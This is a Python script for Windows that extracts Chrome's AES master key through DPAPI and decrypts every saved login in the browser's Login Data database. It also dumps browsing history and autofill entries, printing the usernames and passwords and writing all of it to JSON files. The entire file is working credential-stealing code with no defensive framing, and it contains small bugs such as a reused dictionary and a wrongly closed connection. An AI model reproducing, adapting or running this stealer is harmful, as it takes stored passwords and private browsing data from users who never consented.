import os
import sqlite3
import base64
import win32crypt
import json
from Crypto.Cipher import AES
import shutil

LOCAL_STATE = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State'
print ("ALL THE PASSWORDS: ")
def get_master_key():
    with open(LOCAL_STATE,'r') as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        # print("Probably saved password from Chrome version older than v80\n")
        # print(str(e))
        return "Chrome < 80"
    
master_key = get_master_key()
data_path = os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
stmt= "SELECT origin_url, username_value, password_value FROM logins"
login_db = os.path.join(data_path, 'Login Data')
c = sqlite3.connect(login_db)
cursor = c.cursor()
cursor.execute(stmt)
login_data = cursor.fetchall()
passwords = []
passwords_dict = {}

try:
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for r in cursor.fetchall():
        url = r[0]
        username = r[1]
        encrypted_password = r[2]
        decrypted_password = decrypt_password(encrypted_password, master_key)
        passwords_dict["website"] = url
        passwords_dict["username"] = username
        passwords_dict["password"] = decrypted_password
        passwords.append(passwords_dict)
        if len(username) > 0:
            print("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
except Exception as e:
    pass
cursor.close()
c.close()
try:
    os.remove("Loginvault.db")
except Exception as e:
    pass

print("USER HISTORY: ")
con = sqlite3.connect(data_path+ '\\History')
cursor = con.cursor()
cursor.execute("SELECT url FROM urls")
urls = cursor.fetchall()
history = []

for url in urls:
    history.append(url[0])

print("SELECT A TABLE FOR AUTOFILL WEB DATA:")
con = sqlite3.connect(data_path+ '\\Web Data')
cursor = con.cursor()

dict_l = []
dict_auto = {}

try:
    cursor.execute("SELECT * FROM autofill")
    for r in cursor.fetchall():
        dict_auto={"field":r[0],"data":r[1]}
        dict_l.append(dict_auto)
        print(r)
except Exception as e:
    pass
cursor.close()
c.close()
try:
    os.remove("Loginvault.db")
except Exception as e:
    pass

with open('autofill.json','w+') as f:
    json.dump(dict_l,f)

with open('password_username.json','w+') as f:
    json.dump(passwords,f)

with open('browsing_history.json','w+') as f:
    json.dump(history,f)

# with open()